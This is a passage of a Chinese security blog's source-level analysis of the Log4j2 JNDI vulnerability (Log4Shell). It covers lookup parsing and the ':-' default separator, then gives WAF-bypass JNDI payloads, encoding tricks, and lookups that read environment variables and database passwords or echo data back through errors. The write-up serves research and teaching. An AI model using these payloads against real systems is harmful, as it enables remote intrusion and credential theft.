(org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">481</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">logParent:<span class="number">531</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">500</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">481</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">456</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">63</span>, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">161</span>, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:<span class="number">2205</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:<span class="number">2159</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:<span class="number">2142</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:<span class="number">2034</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:<span class="number">1899</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">info:<span class="number">1444</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:<span class="number">25</span>, App (com.example)</span><br></pre></td></tr></table></figure>
+
+<p>这里简单扫一眼，能看到最底下，倒数第三行，有一个比较显眼的方法——logIfEnabled，看一下代码：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764994386970-9841e6df-7d4e-4a35-a6e0-757c15e60359.png"  alt="img"></p>
+<p>这里最关键是这个if条件，跟进isEnabled，再跟进filter：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764999570985-c09f57af-6a37-4133-aff7-2ad1021affcd.png"  alt="img"></p>
+<p>App里设置的打印等级为debug，对应500；漏洞触发点是logger.info，对应400。因此能够满足条件，进入后续解析。</p>
+<p>补充一下日志等级排序：trace &lt; debug &lt; info &lt; warn &lt; error &lt; fatal</p>
+<p>打印等级可以在配置文件设置，也可以在代码中临时修改：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764999755073-913faa34-ad99-4930-bef7-3ad63c5c91eb.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764999764977-966f76c9-0b81-439f-8ace-5f38beacea68.png"  alt="img"></p>
+<p>关于日志级别修改，也可以参考官方文档：<a class="link"   target="_blank" rel="noopener" href="https://logging.apache.ac.cn/log4j/2.x/manual/customloglevels.html" >https://logging.apache.ac.cn/log4j/2.x/manual/customloglevels.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>总结：</p>
+<p>除了版本&lt;&#x3D;2.14.1，还需要看设置的日志等级和触发点的日志等级。</p>
+<h2 id="payload解析分析"><a href="#payload解析分析" class="headerlink" title="payload解析分析"></a>payload解析分析</h2><p>还是用上面的App.java，不过可以把前面的都注释，只留下最后的jndi触发点。</p>
+<p>这里稍微改一下，vul改成下面的，方便展示嵌套解析的情况。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vul = <span class="string">&quot;$&#123;jndi:$&#123;lower:L&#125;dap://127.0.0.1:50389/b67a28&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>调用栈也是和上面一样的。</p>
+<p>自己分析的时候，我喜欢从上往下分析调用栈，所以这里也采取这种方式。</p>
+<h3 id="Interpolator-lookup"><a href="#Interpolator-lookup" class="headerlink" title="Interpolator#lookup"></a>Interpolator#lookup</h3><p>首先看到Interpolator#lookup：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765000413859-e5e274b3-7235-4a0f-8649-2b851e8d19eb.png"  alt="img"></p>
+<p>更上面的调用栈不看了，因为就是一步步走到经典JNDI的过程。这里看到，已经取出${}里面的文本了，并且根据冒号做了分割，关键代码的作用已在图上标出。</p>
+<p><strong>这个方法的主要功能是</strong>：根据冒号分割协议与文本，根据协议从strLookupMap中获取合适的lookup对象，并调用lookup方法完成进一步解析。</p>
+<p>看看strLookupMap还能解析哪些协议：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765000755414-c961142c-e8d7-4818-aeb8-59e30c600edb.png"  alt="img"></p>
+<p>这些协议为后面的进一步利用或绕过提供了思路。</p>
+<p>这在官方文档中也有提到：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://logging.apache.ac.cn/log4j/2.x/manual/configuration.html#PropertySubstitution" >https://logging.apache.ac.cn/log4j/2.x/manual/configuration.html#PropertySubstitution<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765006007548-a578c876-5af9-45be-a7c5-be1bbdc2615f.png"  alt="img"></p>
+<h3 id="StrSubstitutor-substitute"><a href="#StrSubstitutor-substitute" class="headerlink" title="StrSubstitutor#substitute"></a>StrSubstitutor#substitute</h3><p>再往前看调用栈，这里我关注的是StrSubstitutor#substitute：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765000950076-57d88836-fac3-491a-9778-e6184bec8ac0.png"  alt="img"></p>
+<p>前后的调用栈都是一些简单的调用，而这个方法从篇幅看就比较重要，从上下文看，这个方法处理后，${}就消失了。所以，我应该重点看看这个方法。</p>
+<p>开头就定义了一些matcher，如图：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765001188779-46bc7742-14a2-4752-b39e-42de95faa263.png"  alt="img"></p>
+<p>分别匹配${，}，:-。这里的 :- 是第一次出现，不知道干什么用的，留意一下。</p>
+<p>接着，进入while循环，一个个字符遍历传入的日志消息，这里是${jndi:ldap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;b67a28}</p>
+<p>当满足当前pos（position的缩写）的字符是$，下一个字符是{时，即出现 ${ 时，startMatchLen等于2，进入else if和else判断：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765002805430-47a5214a-551b-4315-b8c9-cf592daf6a9f.png"  alt="img"></p>
+<p>中间的else if 是处理转义字符的，其判断逻辑是，当前pos的前一个字符是转义字符的话，就不进行解析，并删除转义字符，也是一个常见的功能。不过这里的转义字符是$。所以$${jndi:ldap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;b67a28}最终会被日志打印为：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765002956264-8d8e3622-a477-4883-bd2c-cc2dda8222c4.png"  alt="img"></p>
+<p>继续看下面的<strong>else</strong>，代码如图：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765003909903-3b3ba323-d3ab-4115-b5ee-3b10e9a7579b.png"  alt="img"></p>
+<p>先关注一下如何处理嵌套情况。在962行，会继续判断是否出现 ${ ，出现的话，nestedVarCount++，即嵌套数加一。当出现suffix尾缀，即 } 时，会在974行判断是否有嵌套次数，有的话，就不进入解析，而是对nestedVarCount–。这样做的目的是为了找到匹配的 ${ 和 } 以我们一开始的${jndi:${lower:L}dap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;b67a28}为例，第一个${ 应该对应最后的 } ，而不是 L} 中的 } 。</p>
+<p>当遍历到最后一个 } 时，能够进入 nestedVarCount &#x3D;&#x3D; 0 的判断，开始解析：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765004384158-57e4a352-6693-4c92-81d1-2201548f3020.png"  alt="img"></p>
+<p>可以看到，这里已经脱去了最外层的 ${} ，然后又嵌套调用 substitute方法，继续对存在的 ${} 进行处理。</p>
+<p><strong>总结一下</strong>，substitute会通过嵌套处理，一层层脱去 ${} ，先解析最里面的。</p>
+<p>继续看nestedVarCount &#x3D;&#x3D; 0 这个if中的逻辑。</p>
+<p>首先是将内部嵌套的进行解析，一开始的${jndi:${lower:L}dap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;b67a28}变成了jndi:ldap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;b67a28，如图：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765004772110-d01a12d3-461d-43b0-bfc1-10a7f6f5eac0.png"  alt="img"></p>
+<p>接下来会进入到一些特殊分隔符的匹配，如图：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764989667110-9af169c0-5818-48cb-87dc-6ec5c2bbeb0b.png"  alt="img"></p>
+<p>这个等一下会单独讲，先继续看下面的。</p>
+<p>如果没有特殊分隔符，最终就会通过resolveVariable对varName，也就是传入的payload进行处理：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765005034970-2d740ef4-7135-4622-b35b-271dec5868f1.png"  alt="img"></p>
+<p>跟进后，就是上一部分Interpolator#lookup的内容了，即根据协议找lookup对象，然后进行解析。</p>
+<h3 id="特殊分隔符分析"><a href="#特殊分隔符分析" class="headerlink" title="特殊分隔符分析"></a>特殊分隔符分析</h3><p>回到刚刚跳过的部分</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764989667110-9af169c0-5818-48cb-87dc-6ec5c2bbeb0b.png"  alt="img"></p>
+<p>这里主要有两种分隔符，:&#x2F;-和:-</p>
+<p>这里面会涉及到两个比较重要的变量，varName和varDefaultValue。前者最终进入resolveVariable进行解析（比如jndi:ldap:&#x2F;&#x2F;xxxx），后者作为解析结果为空时的默认值。</p>
+<p>具体作用如下：</p>
+<p>1、举例说明 :-</p>
+<ul>
+<li>${a:-b}</li>
+</ul>
+<p>首先被处理成a:-b，然后a:-b被赋值为varName，最终进入resolveVariable解析，被拆分成a, -b，a对应协议部分，-b对应协议内容，如图：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764990189949-e2c35421-c796-44ba-a3d8-0f90faf54057.png"  alt="img"></p>
+<p>这样自然不会产生解析结果，因此原样打印日志：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764990242461-5cea62be-3889-4d78-a75e-6cab9b3ac8ff.png"  alt="img"></p>
+<ul>
+<li>${a:-b123:-xyz}</li>
+</ul>
+<p>首先被处理成a:-b123:-xyz，这时候由于进入的是:-的if，所以会继续向后检测 :- 。最终，会先把前面的a:-b123进一步处理成a:b123作为varName，并把xyz作为varDefaultValue，如图：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764990542004-eff1da88-ead0-40ca-9d6b-fea4fbbd7ffd.png"  alt="img"></p>
+<p>于是，最终进入resolveVariable解析的就是a:b123，这样也自然不会解析成功。这时候，varDefaultValue就派上用场，作为最终的解析结果，如图：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764990688115-d549dc0f-74c9-47fe-9599-e8812e6fe45a.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764990714211-3a02c52b-d7be-4f04-9174-6663846de21e.png"  alt="img"></p>
+<p>这里说实话感觉挺奇怪的，理论上varName应该是a:-b123才对，不然反斜杠转义的意义何在？</p>
+<ul>
+<li>${a:-b123:-xyz:-qwe}</li>
+</ul>
+<p>找到第一个:-后，后面的就全是varDefaultValue了，所以日志结果为：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764990786099-38b14538-e185-454b-a03d-a0fe637cb03c.png"  alt="img"></p>
+<p>2、举例说明 :-</p>
+<ul>
+<li>${a:-b123:-xyz}</li>
+</ul>
+<p>这里的逻辑更简单点，将第一个 :- 后的内容作为varDefaultValue，前面的作为varName，代码如图：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764991055739-257507a4-18d8-441d-bccf-cc3f73c17b47.png"  alt="img"></p>
+<p>a自然无法被resolve解析，最终的日志结果：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764991102123-4d3258d2-156d-4dab-b787-06b4f0602421.png"  alt="img"></p>
+<ul>
+<li>${a:b123:-xyz321:-qwe}</li>
+</ul>
+<p>分成a:b123   xyz321:-qwe两部分，前面作为varName，进入resolve解析，后面作为varDefaultValue。</p>
+<p>最终日志：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764991215007-048b5a1b-bb9e-4e28-957b-a033e2059868.png"  alt="img"></p>
+<ul>
+<li>${sys:java.version:-xyz123}</li>
+</ul>
+<p>这时候varName部分解析成功，自然输出解析后的内容：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764991326816-6726e5ab-94b7-4fbf-b571-abbeedba88d3.png"  alt="img"></p>
+<p>关于默认属性这一点，官方文档也有提到：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://logging.apache.ac.cn/log4j/2.x/manual/configuration.html#PropertySubstitution" >https://logging.apache.ac.cn/log4j/2.x/manual/configuration.html#PropertySubstitution<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765005894020-5e0d398b-c6ae-4309-a9e5-da68989c78a8.png"  alt="img"></p>
+<p>总结一下，可以写成 ${a:b:-default} 形式，当前面的协议无效时，就会取后面的默认值。</p>
+<p>那我前言里写的灰盒测试是什么意思呢？其实就是在发现有 :-，:- 这种matcher后，不去仔细看源码，而是直接写几个案例运行，看输出结果，从而确定这些特殊分隔符的作用。这个时候，如何构造合适的例子就很重要。同样的方式也可以运用在，由于对URL的解析不同，从而造成权限绕过的漏洞上。这部分可以看：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/gpy1q8/gl653fmytz1hoyev" >7. JEECG-灰盒Fuzzing<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="MessagePatternConverter-format"><a href="#MessagePatternConverter-format" class="headerlink" title="MessagePatternConverter#format"></a>MessagePatternConverter#format</h3><p>这里的format方法，对日志消息里的 ${ 会进行识别，从而进入后面的解析：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765096100432-282858fa-a97d-46c9-951c-bf1e051c479f.png"  alt="img"></p>
+<p>而在之后的修复中，是不会对 ${ 进行判断的，后面看补丁的时候会知道。另外，这里的noLookups选项，也暗示了，能够通过修改启动配置来实现对所有lookup的禁用。</p>
+<p>idea可以直接增加JVM选项：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765097178116-c41b6c66-4347-463d-a420-c257ec8629cf.png"  alt="img"></p>
+<h1 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h1><p>有了上面的分析，现在来看看怎么对waf进行一些绕过。</p>
+<p>这里直接搬运网上的了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;a:-j&#125;ndi:ldap://127.0.0.1:1389/&#125;</span><br><span class="line">$&#123;$&#123;a:-j&#125;n$&#123;::-d&#125;i:ldap://127.0.0.1:1389/&#125;</span><br><span class="line">$&#123;$&#123;lower:jn&#125;di:ldap://127.0.0.1:1389/&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;di:ldap://127.0.0.1:1389/&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;$&#123;::-di&#125;:ldap://127.0.0.1:1389/&#125;</span><br></pre></td></tr></table></figure>
+
+<p>另外，还可以利用一些特殊字符的大小写转化问题（似乎在py ssti 绕过中遇到过）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ı =&gt; upper =&gt; i (Java 中测试可行)</span><br><span class="line"></span><br><span class="line">ſ =&gt; upper =&gt; S (Java 中测试可行)</span><br><span class="line"></span><br><span class="line">İ =&gt; upper =&gt; i (Java 中测试不可行)</span><br><span class="line"></span><br><span class="line">K =&gt; upper =&gt; k (Java 中测试不可行)</span><br></pre></td></tr></table></figure>
+
+<p>如果涉及到json格式，那还可以尝试各种编码绕过，因为fastjson和jackson组件都支持unicode和hex编码：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u0024\u007b&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;\x24\u007b&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="其他利用"><a href="#其他利用" class="headerlink" title="其他利用"></a>其他利用</h1><h2 id="sys，env，java等协议"><a href="#sys，env，java等协议" class="headerlink" title="sys，env，java等协议"></a>sys，env，java等协议</h2><p>结合其他的协议，有时候能够读取一些敏感信息，参考：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/jas502n/Log4j2-CVE-2021-44228?tab=readme-ov-file" >GitHub - jas502n&#x2F;Log4j2-CVE-2021-44228: Remote Code Injection In Log4j<i class="fas fa-external-link-alt"></i></a> </p>
+<p>sys 实际对应 System.getProperty()</p>
+<p>env 实际对应 System.getenv()</p>
+<p>jndi下也支持dns协议，也可以通过dns外带。</p>
+<p>末尾有详细的利用方式，列举部分：</p>
+<p>env-linux:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLASSPATH,HOME,JAVA_HOME,LANG,LC_TERMINAL,LC_TERMINAL_VERSION,LESS,LOGNAME,LSCOLORS,LS_COLORS,MAIL,NLSPATH,OLDPWD,PAGER,PATH,PWD,SHELL,SHLVL,SSH_CLIENT,SSH_CONNECTION,SSH_TTY,TERM,USER,XDG_RUNTIME_DIR,XDG_SESSION_ID,XFILESEARCHPATH,ZSH,_</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765010659424-8eeffbae-aab8-47ea-a230-634326f17dc5.png"  alt="img"></p>
+<h2 id="bundle协议"><a href="#bundle协议" class="headerlink" title="bundle协议"></a>bundle协议</h2><p>这个单开一段，因为利用条件有些不一样，且提及这个协议的文章比较少。</p>
+<p>参考 <a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg" >log4j 漏洞一些特殊的利用方式<i class="fas fa-external-link-alt"></i></a></p>
+<p>bundle协议对应的lookup代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> String[] keys = key.split(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">keyLen</span> <span class="operator">=</span> keys.length;</span><br><span class="line">        <span class="keyword">if</span> (keyLen != <span class="number">2</span>) &#123;</span><br><span class="line">            LOGGER.warn(LOOKUP, <span class="string">&quot;Bad ResourceBundle key format [&#123;&#125;]. Expected format is BundleName:KeyName.&quot;</span>, key);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">bundleName</span> <span class="operator">=</span> keys[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">bundleKey</span> <span class="operator">=</span> keys[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// The ResourceBundle class caches bundles, no need to cache here.</span></span><br><span class="line">            <span class="keyword">return</span> ResourceBundle.getBundle(bundleName).getString(bundleKey);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> MissingResourceException e) &#123;</span><br><span class="line">            LOGGER.warn(LOOKUP, <span class="string">&quot;Error looking up ResourceBundle [&#123;&#125;].&quot;</span>, bundleName, e);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>从代码上来看就很好理解，把 key 按照 : 分割成两份，第一个是 bundleName 获取 ResourceBundle，第二个是 bundleKey 获取 Properties Value</p>
+<p>ResourceBundle 在 Java 应用开发中经常被用来做国际化，网站通常会给一段表述的内容翻译成多种语言，比如中文简体、中文繁体、英文。</p>
+<p>那开发者可能就会使用 ResourceBundle 来分别加载 classpath 下的 zh_CN.properties、en_US.properties。并按照唯一的 key 取出对应的那段文字。例如： zh_CN.properties</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOGIN_SUCCESS=登录成功</span><br></pre></td></tr></table></figure>
+
+<p>那 <code>ResourceBundle.getBundle(&quot;zh_CN&quot;).getString(&quot;LOGIN_SUCCESS&quot;)</code> 获取到的就是 <code>登录成功</code></p>
+<p>如果系统是 springboot 的话，它会有一个 application.properties 配置文件。里面存放着这个系统的各项配置，其中有可能就包含 redis、mysql 的配置项。当然也不止 springboot，很多其他类型的系统也会写一些类似 jdbc.properties 的文件来存放配置。</p>
+<p>这些 properties 文件都可以通过 ResourceBundle 来获取到里面的配置项。</p>
+<p>比如通过${bundle:application:spring.datasource.password} 来获取数据库密码。</p>
+<p>不过，这个bundle协议在spring环境下的利用有限制，需要将spring默认的日志组件更换成log4j的，如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这种情况可能并不多见。</p>
+<h2 id="不出网回显"><a href="#不出网回显" class="headerlink" title="不出网回显"></a>不出网回显</h2><p>参考 <a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2036012" >浅谈Log4j2信息泄露与不出网回显-腾讯云开发者社区-腾讯云<i class="fas fa-external-link-alt"></i></a></p>
+<p>这里通过报错回显。下面直接搬运了：</p>
+<p>在<code>tryCallAppender</code>方法中<code>catch</code>了<code>RuntimeException</code></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765012612560-9d223fc7-63d7-454d-bffe-f01ca7a9e96b.png"  alt="img"></p>
+<p>如果配置了<code>ignoreExceptions</code>选项，就会直接抛出来</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765012640461-bffd1556-1920-47a3-980b-e6a86a15f531.png"  alt="img"></p>
+<p>接下来就是制造<code>RuntimeException</code></p>
+<p>例如字符串转数字中有一个<code>NumberFormatException</code>异常，它父类的父类是<code>RuntimeException</code></p>
+<p><code>Manager.lookup</code>中<code>name</code>是<code>protocal://host:port/path</code></p>
+<p>其中<code>port</code>本该是<code>int</code>如果给它无法转<code>int</code>的字符串就会抛出这里的信息</p>
+<p>又联想到<code>$&#123;&#125;</code>是支持嵌套标签的，这里嵌入真正想要得到的结果，即可抛出执行结果</p>
+<p>根据这个思路，成功在<code>Tomcat</code>项目中回显执行结果（例如这里的<code>$&#123;java:version&#125;</code>）</p>
+<p>能够回显的<code>Payload</code>是这样：<code>$&#123;jndi:ldap://x.x.x.x:$&#123;java:version&#125;/xxx&#125;</code></p>
+<p>这里也有限制条件，需要在log4j2.xml中配置 ignoreExceptions&#x3D;”false”</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;warn&quot;</span> <span class="attr">name</span>=<span class="string">&quot;MyApp&quot;</span> <span class="attr">packages</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;STDOUT&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span> <span class="attr">ignoreExceptions</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%m%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;STDOUT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在实际的环境中，有开启这个配置的概率，参考<code>apache</code>官方的描述</p>
+<p>大致意思是在<code>FailoverAppender</code>情况下必须设置该选项为<code>false</code></p>
+<p>某些情况下开发者想让错误报出来便于调试，也会故意开启这个选项</p>
+<p>tomcat中使用log4j需要修改web.xml：</p>
